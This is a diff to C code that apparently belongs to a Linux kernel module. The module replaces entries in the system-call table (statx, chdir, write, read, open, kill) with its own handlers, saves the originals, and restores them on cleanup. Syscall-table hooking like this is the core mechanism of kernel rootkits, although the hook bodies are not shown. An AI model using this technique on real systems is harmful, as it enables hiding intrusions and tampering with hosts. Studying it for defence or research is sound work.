@@ -16,40 +16,45 @@ struct hook hooks[] = {
     {.num = __NR_statx, .name = "statx", .func = h_statx},
     {.num = __NR_chdir, .name = "chdir", .func = h_chdir},
     {.num = __NR_write, .name = "write", .func = h_write},
-    {.num = __NR_kill, .name = "kill", .func = h_kill},
     {.num = __NR_read, .name = "read", .func = h_read},
-    0,
+    {.num = __NR_open, .name = "open", .func = h_openat},
+    {.num = __NR_kill, .name = "kill", .func = h_kill},
 };
 
-bool hooks_setup(uint64_t *systable) {
-  struct hook *h = hooks;
+#define hook_count() (sizeof(hooks) / sizeof(hooks[0]))
 
-  for (; NULL != h; h++) {
-    h->orig = (void *)systable[h->num];   // save the old syscall
-    systable[h->num] = (uint64_t)h->func; // replace it with the hooked call
-    debgf("%s: 0x%p -> 0x%p", h->name, h->orig, h->func);
+bool hooks_setup(uint64_t **systable) {
+  uint8_t i = 0;
+
+  for (; i < hook_count(); i++) {
+    hooks[i].orig = (void *)systable[hooks[i].num]; // save the old syscall
+    systable[hooks[i].num] =
+        (uint64_t *)hooks[i].func; // replace it with the hooked call
+    debgf("%s: 0x%px -> 0x%px", hooks[i].name, hooks[i].orig,
+          systable[hooks[i].num]);
   }
 
   return true;
 }
 
-bool hooks_clean(uint64_t *systable) {
-  struct hook *h = hooks;
+bool hooks_clean(uint64_t **systable) {
+  uint8_t i = 0;
 
-  for (; NULL != h; h++) {
-    systable[h->num] = (uint64_t)h->orig; // load the old syscall back again
-    debgf("%s: 0x%p -> 0x%p", h->name, h->func, h->orig);
+  for (; i < hook_count(); i++) {
+    systable[hooks[i].num] =
+        (uint64_t *)hooks[i].orig; // load the old syscall back again
+    debgf("%s: 0x%px -> 0x%px", hooks[i].name, hooks[i].func, hooks[i].orig);
   }
 
   return true;
 }
 
 syscall_t *hooks_find_orig(uint16_t num) {
-  struct hook *h = hooks;
+  uint8_t i = 0;
 
-  for (; NULL != h; h++)
-    if (h->num == num)
-      return h->orig;
+  for (; i < hook_count(); i++)
+    if (hooks[i].num == num)
+      return hooks[i].orig;
 
   return NULL;
 }
